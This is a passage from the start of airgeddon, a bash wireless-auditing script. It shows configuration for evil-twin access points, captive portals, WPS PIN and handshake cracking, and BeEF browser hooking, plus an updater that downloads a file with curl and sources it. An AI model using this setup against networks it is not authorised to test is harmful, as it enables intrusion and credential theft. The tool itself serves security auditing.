#!/usr/bin/env bash
#Title........: airgeddon.sh
#Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
#Author.......: v1s1t0r
#Version......: 10.42
#Usage........: bash airgeddon.sh
#Bash Version.: 4.2 or later

#Global shellcheck disabled warnings
#shellcheck disable=SC2154
#shellcheck disable=SC2034

#Language vars
#Change this line to select another default language. Select one from available values in array
language="ENGLISH"
declare -A lang_association=(
								["en"]="ENGLISH"
								["es"]="SPANISH"
								["fr"]="FRENCH"
								["ca"]="CATALAN"
								["pt"]="PORTUGUESE"
								["ru"]="RUSSIAN"
								["gr"]="GREEK"
								["it"]="ITALIAN"
								["pl"]="POLISH"
								["de"]="GERMAN"
								["tr"]="TURKISH"
								["ar"]="ARABIC"
							)

rtl_languages=(
				"ARABIC"
				)

#Tools vars
essential_tools_names=(
						"iw"
						"awk"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
						"ip"
						"lspci"
						"ps"
					)

optional_tools_names=(
						"wpaclean"
						"crunch"
						"aireplay-ng"
						"mdk4"
						"hashcat"
						"hostapd"
						"dhcpd"
						"nft"
						"ettercap"
						"etterlog"
						"lighttpd"
						"dnsmasq"
						"wash"
						"reaver"
						"bully"
						"pixiewps"
						"bettercap"
						"beef"
						"packetforge-ng"
						"hostapd-wpe"
						"asleap"
						"john"
						"openssl"
						"hcxpcapngtool"
						"hcxdumptool"
						"tshark"
					)

update_tools=("curl")

internal_tools=(
				"xdpyinfo"
				"ethtool"
				"lsusb"
				"rfkill"
				"wget"
				"ccze"
				"xset"
			)

declare -A possible_package_names=(
									[${essential_tools_names[0]}]="iw" #iw
									[${essential_tools_names[1]}]="awk / gawk" #awk
									[${essential_tools_names[2]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[3]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[4]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[5]}]="xterm" #xterm
									[${essential_tools_names[6]}]="iproute2" #ip
									[${essential_tools_names[7]}]="pciutils" #lspci
									[${essential_tools_names[8]}]="procps / procps-ng" #ps
									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
									[${optional_tools_names[1]}]="crunch" #crunch
									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
									[${optional_tools_names[3]}]="mdk4" #mdk4
									[${optional_tools_names[4]}]="hashcat" #hashcat
									[${optional_tools_names[5]}]="hostapd" #hostapd
									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
									[${optional_tools_names[7]}]="nftables" #nft
									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
									[${optional_tools_names[10]}]="lighttpd" #lighttpd
									[${optional_tools_names[11]}]="dnsmasq" #dnsmasq
									[${optional_tools_names[12]}]="reaver" #wash
									[${optional_tools_names[13]}]="reaver" #reaver
									[${optional_tools_names[14]}]="bully" #bully
									[${optional_tools_names[15]}]="pixiewps" #pixiewps
									[${optional_tools_names[16]}]="bettercap" #bettercap
									[${optional_tools_names[17]}]="beef-xss / beef-project" #beef
									[${optional_tools_names[18]}]="aircrack-ng" #packetforge-ng
									[${optional_tools_names[19]}]="hostapd-wpe" #hostapd-wpe
									[${optional_tools_names[20]}]="asleap" #asleap
									[${optional_tools_names[21]}]="john" #john
									[${optional_tools_names[22]}]="openssl" #openssl
									[${optional_tools_names[23]}]="hcxtools" #hcxpcapngtool
									[${optional_tools_names[24]}]="hcxdumptool" #hcxdumptool
									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
									[${update_tools[0]}]="curl" #curl
								)

#More than one alias can be defined separated by spaces at value
declare -A possible_alias_names=(
									["beef"]="beef-xss beef-server"
								)

#General vars
airgeddon_version="10.42"
language_strings_expected_version="10.42-1"
standardhandshake_filename="handshake-01.cap"
standardpmkid_filename="pmkid_hash.txt"
standardpmkidcap_filename="pmkid.cap"
timeout_capture_handshake="20"
timeout_capture_pmkid="25"
tmpdir="/tmp/"
osversionfile_dir="/etc/"
plugins_dir="plugins/"
minimum_bash_version_required="4.2"
resume_message=224
abort_question=12
pending_of_translation="[PoT]"
escaped_pending_of_translation="\[PoT\]"
standard_resolution="1024x768"
curl_404_error="404: Not Found"
rc_file_name=".airgeddonrc"
alternative_rc_file_name="airgeddonrc"
language_strings_file="language_strings.sh"
broadcast_mac="FF:FF:FF:FF:FF:FF"
minimum_hcxdumptool_filterap_version="6.0.0"

#5Ghz vars
ghz="Ghz"
band_24ghz="2.4${ghz}"
band_5ghz="5${ghz}"
valid_channels_24_ghz_regexp="([1-9]|1[0-4])"
valid_channels_24_and_5_ghz_regexp="([1-9]|1[0-4]|3[68]|4[02468]|5[02468]|6[024]|10[02468]|11[02468]|12[02468]|13[2468]|14[0249]|15[13579]|16[15])"
minimum_wash_dualscan_version="1.6.5"

#aircrack vars
aircrack_tmp_simple_name_file="aircrack"
aircrack_pot_tmp="${aircrack_tmp_simple_name_file}.pot"
aircrack_pmkid_version="1.4"

#hashcat vars
hashcat3_version="3.0"
hashcat4_version="4.0.0"
hashcat_hccapx_version="3.40"
minimum_hashcat_pmkid_version="6.0.0"
hashcat_tmp_simple_name_file="hctmp"
hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccap"
hashcat_pot_tmp="${hashcat_tmp_simple_name_file}.pot"
hashcat_output_file="${hashcat_tmp_simple_name_file}.out"
hccapx_tool="cap2hccapx"
possible_hccapx_converter_known_locations=(
										"/usr/lib/hashcat-utils/${hccapx_tool}.bin"
									)

#john the ripper vars
jtr_tmp_simple_name_file="jtrtmp"
jtr_pot_tmp="${jtr_tmp_simple_name_file}.pot"
jtr_output_file="${jtr_tmp_simple_name_file}.out"

#WEP vars
wep_data="wepdata"
wepdir="wep/"
wep_attack_file="ag.wep.sh"
wep_key_handler="ag.wep_key_handler.sh"
wep_processes_file="wep_processes"

#Docker vars
docker_based_distro="Parrot"
docker_io_dir="/io/"

#WPS vars
minimum_reaver_pixiewps_version="1.5.2"
minimum_reaver_nullpin_version="1.6.1"
minimum_bully_pixiewps_version="1.1"
minimum_bully_verbosity4_version="1.1"
minimum_wash_json_version="1.6.2"
known_pins_dbfile="known_pins.db"
pins_dbfile_checksum="pindb_checksum.txt"
wps_default_generic_pin="12345670"
wps_attack_script_file="ag.wpsattack.sh"
wps_out_file="ag.wpsout.txt"
timeout_secs_per_pin="30"
timeout_secs_per_pixiedust="30"

#Repository and contact vars
repository_hostname="github.com"
github_user="v1s1t0r1sh3r3"
github_repository="airgeddon"
branch="master"
script_filename="airgeddon.sh"
urlgithub="https://${repository_hostname}/${github_user}/${github_repository}"
urlscript_directlink="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${script_filename}"
urlscript_pins_dbfile="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${known_pins_dbfile}"
urlscript_pins_dbfile_checksum="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${pins_dbfile_checksum}"
urlscript_language_strings_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${language_strings_file}"
urlscript_options_config_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${rc_file_name}"
urlgithub_wiki="https://${repository_hostname}/${github_user}/${github_repository}/wiki"
mail="v1s1t0r.1s.h3r3@gmail.com"
author="v1s1t0r"

#Dhcpd, Hostapd and misc Evil Twin vars
ip_range="192.169.1.0"
alt_ip_range="192.167.1.0"
router_ip="192.169.1.1"
alt_router_ip="192.167.1.1"
broadcast_ip="192.169.1.255"
alt_broadcast_ip="192.167.1.255"
range_start="192.169.1.33"
range_stop="192.169.1.100"
alt_range_start="192.167.1.33"
alt_range_stop="192.167.1.100"
std_c_mask="255.255.255.0"
ip_mask="255.255.255.255"
std_c_mask_cidr="24"
ip_mask_cidr="32"
any_mask_cidr="0"
any_ip="0.0.0.0"
any_ipv6="::/0"
loopback_ip="127.0.0.1"
loopback_ipv6="::1/128"
routing_tmp_file="ag.iptables_nftables"
dhcpd_file="ag.dhcpd.conf"
dnsmasq_file="ag.dnsmasq.conf"
internet_dns1="8.8.8.8"
internet_dns2="8.8.4.4"
internet_dns3="139.130.4.5"
bettercap_proxy_port="8080"
bettercap_dns_port="5300"
minimum_bettercap_advanced_options="1.5.9"
minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
bettercap2_version="2.0"
bettercap2_sslstrip_working_version="2.28"
ettercap_file="ag.ettercap.log"
bettercap_file="ag.bettercap.log"
bettercap_config_file="ag.bettercap.cap"
bettercap_hook_file="ag.bettercap.js"
beef_port="3000"
beef_control_panel_url="http://${loopback_ip}:${beef_port}/ui/panel"
jshookfile="hook.js"
beef_file="ag.beef.conf"
beef_pass="airgeddon"
beef_db="beef.db"
beef_default_cfg_file="config.yaml"
beef_needed_brackets_version="0.4.7.2"
beef_installation_url="https://github.com/beefproject/beef/wiki/Installation"
hostapd_file="ag.hostapd.conf"
hostapd_wpe_file="ag.hostapd_wpe.conf"
hostapd_wpe_log="ag.hostapd_wpe.log"
control_et_file="ag.et_control.sh"
control_enterprise_file="ag.enterprise_control.sh"
enterprisedir="enterprise/"
certsdir="certs/"
certspass="airgeddon"
default_certs_path="/etc/hostapd-wpe/certs/"
default_certs_pass="whatever"
webserver_file="ag.lighttpd.conf"
webdir="www/"
indexfile="index.htm"
checkfile="check.htm"
cssfile="portal.css"
jsfile="portal.js"
attemptsfile="ag.et_attempts.txt"
currentpassfile="ag.et_currentpass.txt"
et_successfile="ag.et_success.txt"
enterprise_successfile="ag.enterprise_success.txt"
et_processesfile="ag.et_processes.txt"
enterprise_processesfile="ag.enterprise_processes.txt"
asleap_pot_tmp="ag.asleap_tmp.txt"
channelfile="ag.et_channel.txt"
possible_dhcp_leases_files=(
								"/var/lib/dhcp/dhcpd.leases"
								"/var/state/dhcp/dhcpd.leases"
								"/var/lib/dhcpd/dhcpd.leases"
							)
possible_beef_known_locations=(
									"/usr/share/beef/"
									"/usr/share/beef-xss/"
									"/opt/beef/"
									"/opt/beef-project/"
									"/usr/lib/beef/"
									#Custom BeEF location (set=0)
								)

#Connection vars
ips_to_check_internet=(
						"${internet_dns1}"
						"${internet_dns2}"
						"${internet_dns3}"
					)

#Distros vars
known_compatible_distros=(
							"Wifislax"
							"Kali"
							"Parrot"
							"Backbox"
							"BlackArch"
							"Cyborg"
							"Ubuntu"
							"Mint"
							"Debian"
							"SuSE"
							"CentOS"
							"Gentoo"
							"Fedora"
							"Red Hat"
							"Arch"
							"OpenMandriva"
							"Pentoo"
							"Manjaro"
						)

known_arm_compatible_distros=(
								"Raspbian"
								"Parrot arm"
								"Kali arm"
							)

#Hint vars
declare main_hints=(128 134 163 437 438 442 445 516 590 626 660 697)
declare dos_hints=(129 131 133 697)
declare handshake_pmkid_hints=(127 130 132 664 665 697)
declare dos_handshake_hints=(142 697)
declare decrypt_hints=(171 179 208 244 163 697)
declare personal_decrypt_hints=(171 178 179 208 244 163 697)
declare enterprise_decrypt_hints=(171 179 208 244 163 610 697)
declare select_interface_hints=(246 697)
declare language_hints=(250 438)
declare option_hints=(445 250 448 477 591 626 697)
declare evil_twin_hints=(254 258 264 269 309 328 400 509 697)
declare evil_twin_dos_hints=(267 268 509 697)
declare beef_hints=(408)
declare wps_hints=(342 343 344 356 369 390 490 625 697)
declare wep_hints=(431 429 428 432 433 697)
declare enterprise_hints=(112 332 483 518 629 301 697)

#Charset vars
crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
crunch_numbercharset="0123456789"
crunch_symbolcharset="!#$%/=?{}[]-*:;"
hashcat_charsets=("?l" "?u" "?d" "?s")

#Tmux vars
session_name="airgeddon"
tmux_main_window="airgeddon-Main"
no_hardcore_exit=0

#Check coherence between script and language_strings file
function check_language_strings() {

	debug_print

	if [ -f "${scriptfolder}${language_strings_file}" ]; then

		language_file_found=1
		language_file_mismatch=0
		#shellcheck source=./language_strings.sh
		source "${scriptfolder}${language_strings_file}"
		set_language_strings_version
		if [ "${language_strings_version}" != "${language_strings_expected_version}" ]; then
			language_file_mismatch=1
		fi
	else
		language_file_found=0
	fi

	if [[ "${language_file_found}" -eq 0 ]] || [[ "${language_file_mismatch}" -eq 1 ]]; then

		language_strings_handling_messages

		generate_dynamic_line "airgeddon" "title"
		if [ "${language_file_found}" -eq 0 ]; then
			echo_colored red "${language_strings_no_file[${language}]}"
			if [ "${airgeddon_version}" = "6.1" ]; then
				echo
				echo_colored yellow "${language_strings_first_time[${language}]}"
			fi
		elif [ "${language_file_mismatch}" -eq 1 ]; then
			echo_colored red "${language_strings_file_mismatch[${language}]}"
		fi

		echo
		echo_colored blue "${language_strings_try_to_download[${language}]}"
		read -p "${language_strings_key_to_continue[${language}]}" -r

		if check_repository_access; then

			if download_language_strings_file; then
				echo
				echo_colored yellow "${language_strings_successfully_downloaded[${language}]}"
				read -p "${language_strings_key_to_continue[${language}]}" -r
				clear
				return 0
			else
				echo
				echo_colored red "${language_strings_failed_downloading[${language}]}"
			fi
		else
			echo
			echo_colored red "${language_strings_failed_downloading[${language}]}"
		fi

		echo
		echo_colored blue "${language_strings_exiting[${language}]}"
		echo
		hardcore_exit
	fi
}

#Download the language strings file
function download_language_strings_file() {

	debug_print

	local lang_file_downloaded=0
	remote_language_strings_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_language_strings_file} 2> /dev/null)

	if [[ -n "${remote_language_strings_file}" ]] && [[ "${remote_language_strings_file}" != "${curl_404_error}" ]]; then
		lang_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_language_strings_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_language_strings_file} 2> /dev/null)
			if [[ -n "${remote_language_strings_file}" ]] && [[ "${remote_language_strings_file}" != "${curl_404_error}" ]]; then
				lang_file_downloaded=1
			fi
		fi
	fi

	if [ "${lang_file_downloaded}" -eq 1 ]; then
		echo "${remote_language_strings_file}" > "${scriptfolder}${language_strings_file}"
		chmod +x "${scriptfolder}${language_strings_file}" > /dev/null 2>&1
		#shellcheck source=./language_strings.sh
		source "${scriptfolder}${language_strings_file}"
		return 0
	else
		return 1
	fi
}

#Set messages for language_strings handling
function language_strings_handling_messages() {

	declare -gA language_strings_no_file
	language_strings_no_file["ENGLISH"]="Error. Language strings file not found"
	language_strings_no_file["SPANISH"]="Error. No se ha encontrado el fichero de traducciones"
	language_strings_no_file["FRENCH"]="Erreur. Fichier contenant les traductions absent"
	language_strings_no_file["CATALAN"]="Error. No s'ha trobat el fitxer de traduccions"
	language_strings_no_file["PORTUGUESE"]="Erro. O arquivo de tradução não foi encontrado"
	language_strings_no_file["RUSSIAN"]="Ошибка. Не найден языковой файл"
	language_strings_no_file["GREEK"]="Σφάλμα. Το αρχείο γλωσσών δεν βρέθηκε"
	language_strings_no_file["ITALIAN"]="Errore. Non si trova il file delle traduzioni"
	language_strings_no_file["POLISH"]="Błąd. Nie znaleziono pliku tłumaczenia"
	language_strings_no_file["GERMAN"]="Fehler. Die Übersetzungsdatei wurde nicht gefunden"
	language_strings_no_file["TURKISH"]="Hata. Çeviri dosyası bulunamadı"
	language_strings_no_file["ARABIC"]="خطأ. ملف اللغة غير موجود"

	declare -gA language_strings_file_mismatch
	language_strings_file_mismatch["ENGLISH"]="Error. The language strings file found mismatches expected version"
	language_strings_file_mismatch["SPANISH"]="Error. El fichero de traducciones encontrado no es la versión esperada"
	language_strings_file_mismatch["FRENCH"]="Erreur. Les traductions trouvées ne sont pas celles attendues"
	language_strings_file_mismatch["CATALAN"]="Error. El fitxer de traduccions trobat no és la versió esperada"
	language_strings_file_mismatch["PORTUGUESE"]="Erro. O a versão do arquivos de tradução encontrado é a incompatível"
	language_strings_file_mismatch["RUSSIAN"]="Ошибка. Языковой файл не соответствует ожидаемой версии"
	language_strings_file_mismatch["GREEK"]="Σφάλμα. Το αρχείο γλωσσών που έχει βρεθεί δεν αντιστοιχεί με την προαπαιτούμενη έκδοση"
	language_strings_file_mismatch["ITALIAN"]="Errore. Il file delle traduzioni trovato non è la versione prevista"
	language_strings_file_mismatch["POLISH"]="Błąd. Znaleziony plik tłumaczenia nie jest oczekiwaną wersją"
	language_strings_file_mismatch["GERMAN"]="Fehler. Die gefundene Übersetzungsdatei ist nicht die erwartete Version"
	language_strings_file_mismatch["TURKISH"]="Hata. Bulunan çeviri dosyası beklenen sürüm değil"
	language_strings_file_mismatch["ARABIC"]="خطأ. ملف اللغة غيرمتطابق مع الإصدار المتوقع"

	declare -gA language_strings_try_to_download
	language_strings_try_to_download["ENGLISH"]="airgeddon will try to download the language strings file..."
	language_strings_try_to_download["SPANISH"]="airgeddon intentará descargar el fichero de traducciones..."
	language_strings_try_to_download["FRENCH"]="airgeddon va essayer de télécharger les fichiers de traductions..."
	language_strings_try_to_download["CATALAN"]="airgeddon intentarà descarregar el fitxer de traduccions..."
	language_strings_try_to_download["PORTUGUESE"]="O airgeddon tentará baixar o arquivo de tradução..."
	language_strings_try_to_download["RUSSIAN"]="airgeddon попытается загрузить языковой файл..."
	language_strings_try_to_download["GREEK"]="Το airgeddon θα προσπαθήσει να κατεβάσει το αρχείο γλωσσών..."
	language_strings_try_to_download["ITALIAN"]="airgeddon cercherá di scaricare il file delle traduzioni..."
	language_strings_try_to_download["POLISH"]="airgeddon spróbuje pobrać plik tłumaczeń..."
	language_strings_try_to_download["GERMAN"]="airgeddon wird versuchen, die Übersetzungsdatei herunterzuladen..."
	language_strings_try_to_download["TURKISH"]="airgeddon çeviri dosyasını indirmeye çalışacak..."
	language_strings_try_to_download["ARABIC"]="سيحاول airgeddon تنزيل ملف سلاسل اللغة ..."

	declare -gA language_strings_successfully_downloaded
	language_strings_successfully_downloaded["ENGLISH"]="Language strings file was successfully downloaded"
	language_strings_successfully_downloaded["SPANISH"]="Se ha descargado con éxito el fichero de traducciones"
	language_strings_successfully_downloaded["FRENCH"]="Les fichiers traduction ont été correctement téléchargés"
	language_strings_successfully_downloaded["CATALAN"]="S'ha descarregat amb èxit el fitxer de traduccions"
	language_strings_successfully_downloaded["PORTUGUESE"]="O arquivo de tradução foi baixado com sucesso"
	language_strings_successfully_downloaded["RUSSIAN"]="Языковой файл был успешно загружен"
	language_strings_successfully_downloaded["GREEK"]="Το αρχείο γλωσσών κατέβηκε με επιτυχία"
	language_strings_successfully_downloaded["ITALIAN"]="Il file delle traduzioni è stato scaricato con successo"
	language_strings_successfully_downloaded["POLISH"]="Plik z tłumaczeniem został pomyślnie pobrany"
	language_strings_successfully_downloaded["GERMAN"]="Die Übersetzungsdatei wurde erfolgreich heruntergeladen"
	language_strings_successfully_downloaded["TURKISH"]="Çeviri dosyası başarıyla indirildi"
	language_strings_successfully_downloaded["ARABIC"]="تم تنزيل ملف سلاسل اللغة بنجاح"

	declare -gA language_strings_failed_downloading
	language_strings_failed_downloading["ENGLISH"]="The language string file can't be downloaded. Check your internet connection or download it manually from ${normal_color}${urlgithub}"
	language_strings_failed_downloading["SPANISH"]="No se ha podido descargar el fichero de traducciones. Comprueba tu conexión a internet o descárgalo manualmente de ${normal_color}${urlgithub}"
	language_strings_failed_downloading["FRENCH"]="Impossible de télécharger le fichier traduction. Vérifiez votre connexion à internet ou téléchargez le fichier manuellement ${normal_color}${urlgithub}"
	language_strings_failed_downloading["CATALAN"]="No s'ha pogut descarregar el fitxer de traduccions. Comprova la connexió a internet o descarrega'l manualment de ${normal_color}${urlgithub}"
	language_strings_failed_downloading["PORTUGUESE"]="Não foi possível baixar o arquivos de tradução. Verifique a sua conexão com a internet ou baixe manualmente em ${normal_color}${urlgithub}"
	language_strings_failed_downloading["RUSSIAN"]="Языковой файл не может быть загружен. Проверьте подключение к Интернету или загрузите его вручную с ${normal_color}${urlgithub}"
	language_strings_failed_downloading["GREEK"]="Το αρχείο γλωσσών δεν μπορεί να κατέβει. Ελέγξτε τη σύνδεση σας με το διαδίκτυο ή κατεβάστε το χειροκίνητα ${normal_color}${urlgithub}"
	language_strings_failed_downloading["ITALIAN"]="Impossibile scaricare il file delle traduzioni. Controlla la tua connessione a internet o scaricalo manualmente ${normal_color}${urlgithub}"
	language_strings_failed_downloading["POLISH"]="Nie można pobrać pliku tłumaczenia. Sprawdź połączenie internetowe lub pobierz go ręcznie z ${normal_color}${urlgithub}"
	language_strings_failed_downloading["GERMAN"]="Die Übersetzungsdatei konnte nicht heruntergeladen werden. Überprüfen Sie Ihre Internetverbindung oder laden Sie sie manuell von ${normal_color}${urlgithub} runter"
	language_strings_failed_downloading["TURKISH"]="Çeviri dosyası indirilemedi. İnternet bağlantınızı kontrol edin veya manuel olarak indirin ${normal_color}${urlgithub}"
	language_strings_failed_downloading["ARABIC"]="لا يمكن تنزيل ملف اللغة. تحقق من اتصالك بالإنترنت أو قم بتنزيله يدويًا من ${normal_color}${urlgithub}"

	declare -gA language_strings_first_time
	language_strings_first_time["ENGLISH"]="If you are seeing this message after an automatic update, don't be scared! It's probably because airgeddon has different file structure since version 6.1. It will be automatically fixed"
	language_strings_first_time["SPANISH"]="Si estás viendo este mensaje tras una actualización automática, ¡no te asustes! probablemente es porque a partir de la versión 6.1 la estructura de ficheros de airgeddon ha cambiado. Se reparará automáticamente"
	language_strings_first_time["FRENCH"]="Si vous voyez ce message après une mise à jour automatique ne vous inquiétez pas! A partir de la version 6.1 la structure de fichier d'airgeddon a changé. L'ajustement se fera automatiquement"
	language_strings_first_time["CATALAN"]="Si estàs veient aquest missatge després d'una actualització automàtica, no t'espantis! probablement és perquè a partir de la versió 6.1 l'estructura de fitxers de airgeddon ha canviat. Es repararà automàticament"
	language_strings_first_time["PORTUGUESE"]="Se você está vendo esta mensagem depois de uma atualização automática, não tenha medo! A partir da versão 6.1 da estrutura de arquivos do airgeddon mudou. Isso será corrigido automaticamente"
	language_strings_first_time["RUSSIAN"]="Если вы видите это сообщение после автоматического обновления, не переживайте! Вероятно, это объясняется тем, что, начиная с версии 6.1, airgeddon имеет другую структуру файлов. Проблема будет разрешена автоматически"
	language_strings_first_time["GREEK"]="Εάν βλέπετε αυτό το μήνυμα μετά από κάποια αυτόματη ενημέρωση, μην τρομάξετε! Πιθανόν είναι λόγω της διαφορετικής δομής του airgeddon μετά από την έκδοση 6.1. Θα επιδιορθωθεί αυτόματα"
	language_strings_first_time["ITALIAN"]="Se stai vedendo questo messaggio dopo un aggiornamento automatico, niente panico! probabilmente è perché a partire dalla versione 6.1 é cambiata la struttura dei file di airgeddon. Sarà riparato automaticamente"
	language_strings_first_time["POLISH"]="Jeśli widzisz tę wiadomość po automatycznej aktualizacji, nie obawiaj się! To prawdopodobnie dlatego, że w wersji 6.1 zmieniła się struktura plików airgeddon. Naprawi się automatycznie"
	language_strings_first_time["GERMAN"]="Wenn Sie diese Nachricht nach einem automatischen Update sehen, haben Sie keine Angst! Das liegt vermutlich daran, dass ab Version 6.1 die Dateistruktur von airgeddon geändert wurde. Es wird automatisch repariert"
	language_strings_first_time["TURKISH"]="Otomatik bir güncellemeden sonra bu mesajı görüyorsanız, korkmayın! muhtemelen 6.1 sürümünden itibaren airgeddon dosya yapısı değişmiştir. Otomatik olarak tamir edilecektir"
	language_strings_first_time["ARABIC"]="إذا كنت ترى هذه الرسالة بعد التحديث التلقائي ، فلا تخف! ربما يرجع السبب في ذلك إلى أن airgeddon له بنية ملفات مختلفة منذ الإصدار 6.1. سيتم إصلاحه تلقائيًا "

	declare -gA language_strings_exiting
	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
	language_strings_exiting["SPANISH"]="Saliendo de airgeddon script v${airgeddon_version} - Nos vemos pronto! :)"
	language_strings_exiting["FRENCH"]="Fermeture du script airgeddon v${airgeddon_version} - A bientôt! :)"
	language_strings_exiting["CATALAN"]="Sortint de airgeddon script v${airgeddon_version} - Ens veiem aviat! :)"
	language_strings_exiting["PORTUGUESE"]="Saindo do script airgeddon v${airgeddon_version} - Até breve! :)"
	language_strings_exiting["RUSSIAN"]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
	language_strings_exiting["GREEK"]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"
	language_strings_exiting["ITALIAN"]="Uscendo dallo script airgeddon v${airgeddon_version} - A presto! :)"
	language_strings_exiting["POLISH"]="Wyjście z skryptu airgeddon v${airgeddon_version} - Do zobaczenia wkrótce! :)"
	language_strings_exiting["GERMAN"]="Sie verlassen airgeddon v${airgeddon_version} - Bis bald! :)"
	language_strings_exiting["TURKISH"]="airgeddon yazılımından çıkış yapılıyor v${airgeddon_version} - Yakında görüşürüz! :)"
	language_strings_exiting["ARABIC"]="الخروج من البرنامج airgeddon v${airgeddon_version}- نراكم قريبًا! :)"

	declare -gA language_strings_key_to_continue
	language_strings_key_to_continue["ENGLISH"]="Press [Enter] key to continue..."
	language_strings_key_to_continue["SPANISH"]="Pulsa la tecla [Enter] para continuar..."
	language_strings_key_to_continue["FRENCH"]="Pressez [Enter] pour continuer..."
	language_strings_key_to_continue["CATALAN"]="Prem la tecla [Enter] per continuar..."
	language_strings_key_to_continue["PORTUGUESE"]="Pressione a tecla [Enter] para continuar..."
	language_strings_key_to_continue["RUSSIAN"]="Нажмите клавишу [Enter] для продолжения..."
	language_strings_key_to_continue["GREEK"]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."
	language_strings_key_to_continue["ITALIAN"]="Premere il tasto [Enter] per continuare..."
	language_strings_key_to_continue["POLISH"]="Naciśnij klawisz [Enter] aby kontynuować..."
	language_strings_key_to_continue["GERMAN"]="Drücken Sie die [Enter]-Taste um fortzufahren..."
	language_strings_key_to_continue["TURKISH"]="Devam etmek için [Enter] tuşuna basın..."
	language_strings_key_to_continue["ARABIC"]="اضغط على مفتاح [Enter] للمتابعة ..."
}

#Generic toggle option function
function option_toggle() {

	debug_print

	local required_reboot=0
	if [[ -n "${2}" ]] && [[ "${2}" = "required_reboot" ]]; then
		required_reboot=1
	fi

	local option_var_name="${1}"
	local option_var_value="${!1}"

	if "${option_var_value:-true}"; then
		sed -ri "s:(${option_var_name})=(true):\1=false:" "${rc_path}" 2> /dev/null
		if ! grep "${option_var_name}=false" "${rc_path}" > /dev/null; then
			return 1
		fi

		if [ ${required_reboot} -eq 0 ]; then
			eval "export ${option_var_name}=false"
		fi
	else
		sed -ri "s:(${option_var_name})=(false):\1=true:" "${rc_path}" 2> /dev/null
		if ! grep "${option_var_name}=true" "${rc_path}" > /dev/null; then
			return 1
		fi

		if [ ${required_reboot} -eq 0 ]; then
			eval "export ${option_var_name}=true"
		fi
	fi

	case "${option_var_name}" in
		"AIRGEDDON_BASIC_COLORS")
			remap_colors
		;;
		"AIRGEDDON_EXTENDED_COLORS")
			initialize_extended_colorized_output
		;;
		"AIRGEDDON_5GHZ_ENABLED")
			phy_interface=$(physical_interface_finder "${interface}")
			check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
			secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
			check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
		;;
	esac

	return 0
}

#Get current permanent language
function get_current_permanent_language() {

	debug_print

	current_permanent_language=$(grep "language=" "${scriptfolder}${scriptname}" | grep -v "auto_change_language" | head -n 1 | awk -F "=" '{print $2}')
	current_permanent_language=$(echo "${current_permanent_language}" | sed -e 's/^"//;s/"$//')
}

#Set language as permanent
function set_permanent_language() {

	debug_print

	sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${language}\":" "${scriptfolder}${scriptname}" 2> /dev/null
	if ! grep -E "^[l]anguage=\"${language}\"" "${scriptfolder}${scriptname}" > /dev/null; then
		return 1
	fi
	return 0
}

#Print the current line of where this was called and the function's name. Applies to some (which are useful) functions
function debug_print() {

	if "${AIRGEDDON_DEBUG_MODE:-true}"; then

		declare excluded_functions=(
							"airmon_fix"
							"ask_yesno"
							"check_pending_of_translation"
							"clean_env_vars"
							"contains_element"
							"create_rcfile"
							"echo_colored"
							"env_vars_initialization"
							"env_vars_values_validation"
							"fix_autocomplete_chars"
							"flying_saucer"
							"generate_dynamic_line"
							"initialize_colors"
							"initialize_script_settings"
							"interrupt_checkpoint"
							"language_strings"
							"last_echo"
							"physical_interface_finder"
							"print_hint"
							"print_large_separator"
							"print_simple_separator"
							"read_yesno"
							"remove_warnings"
							"set_script_paths"
							"special_text_missed_optional_tool"
							"store_array"
							"under_construction_message"
						)

		if (IFS=$'\n'; echo "${excluded_functions[*]}") | grep -qFx "${FUNCNAME[1]}"; then
			return 1
		fi

		echo "Line:${BASH_LINENO[1]}" "${FUNCNAME[1]}"
	fi

	return 0
}

#Set the message to show again after an interrupt ([Ctrl+C] or [Ctrl+Z]) without exiting
function interrupt_checkpoint() {

	debug_print

	if [ -z "${last_buffered_type1}" ]; then
		last_buffered_message1=${1}
		last_buffered_message2=${1}
		last_buffered_type1=${2}
		last_buffered_type2=${2}
	else
		if [[ "${1}" -ne "${resume_message}" ]] 2>/dev/null && [[ "${1}" != "${resume_message}" ]]; then
			last_buffered_message2=${last_buffered_message1}
			last_buffered_message1=${1}
			last_buffered_type2=${last_buffered_type1}
			last_buffered_type1=${2}
		fi
	fi
}

#Add the text on a menu when you miss an optional tool
function special_text_missed_optional_tool() {

	debug_print

	declare -a required_tools=("${!3}")

	allowed_menu_option=1
	if ! "${AIRGEDDON_DEVELOPMENT_MODE:-false}"; then
		tools_needed="${optionaltool_needed[${1}]}"
		for item in "${required_tools[@]}"; do
			if [ "${optional_tools[${item}]}" -eq 0 ]; then
